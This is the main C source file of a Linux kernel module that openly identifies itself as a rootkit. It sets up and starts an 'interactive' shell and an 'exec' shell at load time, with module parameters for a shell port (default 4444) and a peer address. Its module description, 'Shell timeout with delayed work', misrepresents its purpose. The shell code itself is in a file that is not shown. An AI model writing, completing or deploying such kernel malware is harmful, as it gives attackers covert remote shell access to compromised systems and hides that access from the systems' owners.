// SPDX-License-Identifier: GPL-2.0
#include <linux/init.h>
#include <linux/module.h>

#include "rootkit.h"

/* ------------------------------------------------------------------ */
/* Module parameters                                                   */
/* ------------------------------------------------------------------ */

struct rk_shell interactive_shell;
struct rk_shell exec_shell;

unsigned short shell_port = 4444;
module_param(shell_port, ushort, 0444);

char peer_addr_str[16] = "127.0.0.1";
module_param_string(peer_address, peer_addr_str, sizeof(peer_addr_str), 0444);

/* ------------------------------------------------------------------ */
/* Module lifecycle                                                    */
/* ------------------------------------------------------------------ */

static int __init rk_init(void)
{
	rk_shell_init(&interactive_shell);
	rk_shell_init(&exec_shell);
	return 0;
}

static void __exit rk_exit(void)
{
	rk_shell_stop(&interactive_shell);
	rk_shell_stop(&exec_shell);
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Shell timeout with delayed work");
